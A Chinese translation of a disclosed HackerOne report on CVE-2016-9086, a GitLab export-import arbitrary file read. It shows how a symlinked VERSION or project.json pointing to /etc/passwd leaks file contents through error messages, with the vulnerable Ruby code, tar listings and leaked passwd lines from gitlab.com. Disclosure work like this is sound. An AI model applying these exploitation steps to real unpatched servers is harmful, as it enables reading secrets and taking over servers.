# 【漏洞分析】GitLab文件读取问题导致的RCE漏洞

## 译文声明
本文为翻译文章，原文来自hackerone。具体内容及含义以原文为准。
**  
**
**翻译：** [WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)
**稿费：** 160 RMB（欢迎投稿！）
**投稿方式：** 发送邮件至linwei#360.cn 或访问[网页版](http://bobao.360.cn/contribute/index)在线投稿。

## 漏洞信息
- **状态：** 已解决
- **披露时间：** 2016年11月3日
- **厂商：** GitLab
- **CVE编号：** [CVE-2016-9086](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9086)
- **类型：** 信息披露漏洞
- **等级：** 高危
- **受影响产品：**
  - 8.13.0～8.13.2
  - 8.12.0～8.12.7
  - 8.11.0～8.11.9
  - 8.10.0～8.10.12
  - 8.9.0～8.9.11

## 漏洞概述
在GitLab CE/EE版本8.9、8.10、8.11、8.12和8.13中存在任意文件读取漏洞，攻击者可能利用此漏洞获取应用程序中的敏感文件访问权限。一旦获取这些机密数据，攻击者可以通过执行恶意命令来访问应用程序服务器。CVSS评分如下：
- 8.9、8.10、8.11和8.12版本：8.4分（CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H）
- 8.13版本：9.0分（CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H），因为该版本中攻击者无需管理员权限即可利用此漏洞。

所有版本的攻击场景都需要导入并启用GitLab的导出文件功能。

## 漏洞分析
GitLab的导出上传功能存在一个漏洞，允许攻击者读取GitLab实例中的任意文件。该漏洞主要是由于JSON.parse中的错误操作导致的，因为JSON.parse可能包含或引用GitLab导出文件的符号链接。

### 分析过程
为了进行分析，我创建了一个演示仓库，并通过项目管理面板导出了GitLab实例。创建新项目后，可以导入这些GitLab文件。通常情况下，简单的GitLab导出文件包含以下内容：

```bash
$ ls -lash
total 48
  8 -rw-r--r--@   1 jobert  staff     5B Oct 25 19:52 VERSION
  8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
  8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json
```

重新加载导出的GitLab文件时，会发生以下步骤：
1. 等待文件写入磁盘（针对大型仓库）。
2. 根据VERSION文件检测导入项目的版本。
3. 根据project.json文件创建一个新的Project实例。

#### 版本检查
我们来看第二步的相关代码（Gitlab::ImportExport::VersionChecker，第12-18行）：

```ruby
def check!
  version = File.open(version_file, &:readline)
  verify_version!(version)
rescue => e
  shared.error(e)
  false
end
```

第13行打开文件并调用`readline`方法返回文件的第一行数据。第16行捕获异常并将错误信息发送到前端。再看第27-31行代码：

```ruby
if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version)
  raise Gitlab::ImportExport::Error.new("Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}")
else
  true
end
```

如果文件版本不正确，系统会抛出异常，异常信息中包含导出文件的版本信息。解压导出文件，用符号链接替换VERSION文件，然后重新压缩。tar文件结构如下：

```bash
$ ls -lash
  8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 VERSION -> /etc/passwd
  8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
  8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json
```

创建新的GitLab导出文件后（在导出目录中执行`tar -czvf test.tar.gz`），加载文件，系统会抛出异常并返回第一行错误信息。

#### 完整文件读取
为了读取完整文件内容，我们继续分析第三步，即创建新的Project实例。相关代码（Gitlab::ImportExport::ProjectTreeRestorer，第11-22行）：

```ruby
def restore
  json = IO.read(@path)
  tree_hash = ActiveSupport::JSON.decode(json)
  project_members = tree_hash.delete('project_members')
  ActiveRecord::Base.no_touching do
    create_relations
  end
rescue => e
  shared.error(e)
  false
end
```

这段代码结构与版本检查类似。第14行调用`IO.read`方法读取文件内容。如果文件不是有效的JSON数据，系统会抛出异常，异常信息中包含文件内容。例如，将`project.json`文件设为指向`/etc/passwd`的符号链接：

```bash
$ ls -lash
  8 -rw-r--r--@   1 jobert  staff    11B Oct 25 20:43 VERSION
  8 -rw-r--r--@   1 jobert  staff   341B Oct 25 19:53 project.bundle
  8 lrwxr-xr-x    1 jobert  staff    11B Oct 25 20:43 project.json -> /etc/passwd
```

使用tar压缩文件并上传[[演示文件下载-test.tar.gz（F130233）]](https://hackerone-attachments.s3.amazonaws.com/production/000/130/233/1a62bf87c15a273b1ff8f5a5b257169a8e44e88e/test.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAJFXIS7KJADBA4QQA%2F20161104%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20161104T033745Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=0d2f6533be8abaab0deb2e35019c1e59f81af476bc58e1909f1a4cb00cc023bb)。文件导入成功后，可以从错误信息中获取链接文件的内容。

以下是gitlab.com中/etc/passwd文件的最后五行数据：

```bash
alejandro:x:1117:1117::/home/alejandro:/bin/bash
prometheus:x:999:999::/opt/prometheus:/bin/false
gitlab-monitor:x:998:998::/opt/gitlab-monitor:/bin/false
postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
brian:x:1118:1118::/home/brian:/bin/bash
```

因此，攻击者可以利用这种方法读取GitLab中Rails项目的机密文件。需要注意的是，这个问题还可能导致RCE漏洞。此外，攻击者甚至可以通过这个漏洞获取GitLab的shell并访问所有代码仓库。